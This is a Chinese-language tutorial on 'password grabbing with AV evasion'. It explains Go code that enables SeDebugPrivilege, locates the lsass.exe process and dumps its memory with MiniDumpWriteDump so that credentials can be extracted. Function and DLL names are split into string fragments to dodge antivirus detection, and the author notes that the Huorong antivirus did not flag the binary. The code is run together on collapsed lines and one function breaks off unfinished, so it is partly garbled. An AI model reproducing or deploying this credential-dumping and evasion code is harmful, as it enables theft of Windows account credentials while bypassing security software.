 密码抓取免杀入门

        然后开始第一个函数的分析  
  
        首先在16行，我们获取到了当前进程的句柄，句柄其实就是一个32位无符号整数，我们平常要找到进程需要从pid到进程，但我们用句柄去访问要比pid更快  
  

        然后就是18-22行，我们找到当前进程的令牌，计算机程序启动的时候，这个程序会携带有一个启动它的用户的令牌，这个令牌标识这个程序在计算机里面是谁打开的，拥有哪些权限，然后给到err，接着就是24-29行，先找一个luid，guid大家都不是很陌生，是程序的全局统一ID，而luid只是局部唯一，比如运行期间中是唯一值就ok，guid是128位而luid是64位  
  
        而36行的ADjustTokenPrivileges函数是启用或禁用指定访问令牌中的权限

![](../Images/cc41ad5e9f390f8b67d40df6add6e34e.png)

        第二个函数Fpid  

        相信大家对于快照都不是很陌生，比如虚拟机的快照，保存当前全部状态，如果虚拟机损坏之后可以利用快照回到保存快照的那段，其实也可以理解为一个备份，为啥要保存快照呢？因为我们没办法直接读取进程中的东西，只能打包成快照的形式进行读取  
        然后就是lsass.exe

![](../Images/abb634b53dfd18dc3bc79f3e2ecac286.png)

        我们需要读取lsass.exe 的进程空间，然后导出各个账密，我们起一个for循环，然后找到lsass.exe这个程序

![](../Images/5f4de4678256e234446db173b54e3c67.png)

        第三个函数MiniDumpWriteDump  
        Minidumpwritedump，是微软提供的一个api，我们可以使用这个函数，将用户模式小型转储信息写入指定的文件

![](../Images/1796ebc2460b3e8c5ee498309b766fe2.png)

        最后一个主函数，先调用了 getseDebugPrivilege 和 fpid，然后用openprocess 返回进程句柄，保存一个 memory.dmp 文件，接着就是使用 createfile 新建一个文件，最后调用MiniDumpWriteDump 结束

![](../Images/101fd6a19d79f940d6d3ec8b79bd96cd.png)

        使用方法，我们把该程序打包为 exe格式，以管理员方式运行mimi.exe，然后会创建一个memory.dmp，可以看到运行的时候动静态火绒没报毒

![](../Images/6f6629c55056c29d844cb4430c3d1e39.png)

import     ("log"     "syscall"    "unsafe"    "golang.org/x/sys/windows" )
var getfpid int
const TH32CS_SNAPPROCESS = 0x00000002
func getSeDebugPrivilege() {    handle := windows.CurrentProcess()  //获取当前进程句柄
    var token windows.Token  //定义一个 windows 令牌    err := windows.OpenProcessToken(handle,windows.TOKEN_ADJUST_PRIVILEGES,&token)  //获取当前进程的令牌    if err != nil {          log.Fatal("[-] " +err.Error()) }  //报错日志
    var luid windows.LUID  //定义 luid     name, _ := windows.UTF16FromString("SeDebugPrivilege")  //定义特权名称    err = windows.LookupPrivilegeValue(nil, &name[0], &luid)  //查看当前特权值，返回到luid 结构体重    if err != nil{    log.Fatal("[-]" +err.Error()) }    var tokenprivileges windows.Tokenprivileges  //一个LUID_AND_ATTRIBUTES 结构体. 每个结构体包括 LUID 和特权的属性。    tokenprivileges.PrivilegeCount = 1    tokenprivileges.Privileges[0].Luid = luid    tokenprivileges.Privileges[0].Attributes = TH32CS_SNAPPROCESS  //属性值
    err = windows.AdjustTokenPrivileges(token,false, &tokenprivileges,uint32(unsafe.Sizeof(tokenprivileges)), nil, nil)  //启用指定令牌访问特权权限    if err != nil{          log.Fatal("[-] " +err.Error())     }}
func fPid() {    var sHandle windows.Handle    const TH32CS_SNAPPROCESS1 = 0x00000002    //获取当前进程快照的各类信息，0x00000002 当前快照的所有进程，0 表示为当前进程    sHandle, err := windows.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS1, uint32(0))     if err != nil {          log.Fatal("[-] " + err.Error())    }    var entry windows.ProcessEntry32  //定义一个快照信息结构体    defer windows.Close(sHandle)  //延迟句柄关闭    entry.Size =uint32(unsafe.Sizeof(entry))
    err = windows.Process32First(sHandle, &entry)  //存放进当前快照    if err != nil{          log.Fatal("[-] " +err.Error())     }

func MiniDumpWriteDump(hProcess windows.Handle, ProcessId uint32, hFile windows.Handle, DumpType uint32) error {    r1 , _ , lastErr := syscall.NewLazyDLL("db"+"gh"+"elp.d"+"ll").NewProc("Mini"+"Dum"+"pWri"+"teDump").Call(uintptr(hProcess), uintptr(ProcessId),uintptr(hFile), uintptr(DumpType), uintptr(0), uintptr(0), uintptr(0))  //关联指定的dbghelp.dll当中的函数，并关联到新的 dll 当中    if r1 == uintptr(1) {          return nil    }  //判断是否关联到 dbghelp.dll    return lastErr  //返回关联后生成的 mimidumpwritedump 函数}
